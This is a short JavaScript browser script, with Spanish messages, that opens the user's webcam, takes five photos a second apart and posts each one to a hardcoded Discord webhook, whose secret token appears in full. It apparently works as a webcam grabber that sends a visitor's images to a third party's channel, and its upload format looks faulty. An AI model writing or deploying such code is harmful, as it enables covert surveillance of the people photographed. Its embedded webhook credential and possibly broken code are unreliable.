let webcamStream;
let picturesTaken = 0;

async function takePictures() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        webcamStream = stream;
        takePicture();
    } catch (error) {
        console.error('Error al acceder a la cámara:', error);
        alert('Error al acceder a la cámara.');
    }
}

function takePicture() {
    const video = document.createElement('video');
    video.srcObject = webcamStream;
    video.onloadedmetadata = async () => {
        video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const pictureData = canvas.toDataURL('image/jpeg');

        sendPicture(pictureData);

        picturesTaken++;
        if (picturesTaken < 5) {
            // Take next picture after a short delay
            setTimeout(takePicture, 1000);
        } else {
            // Release webcam stream
            webcamStream.getTracks().forEach(track => track.stop());
            alert('Fotos tomadas y enviadas a Discord.');
        }
    };
}

function sendPicture(pictureData) {
    const webhookURL = 'https://discord.com/api/webhooks/1183511386358284369/ZguaOCWTWFGL1c8h9mBSZR6m4bbIOL6oeNdMuHV6TDUoqiFiuQcgCbkHnQ8zsbpKdpue'; // Tu URL de webhook de Discord aquí

    const data = {
        content: 'Nueva foto:',
        files: [
            {
                name: `foto_${picturesTaken + 1}.jpg`,
                attachment: pictureData
            }
        ]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error al enviar la foto.');
        }
    })
    .catch(error => console.error('Error al enviar la foto:', error));
}
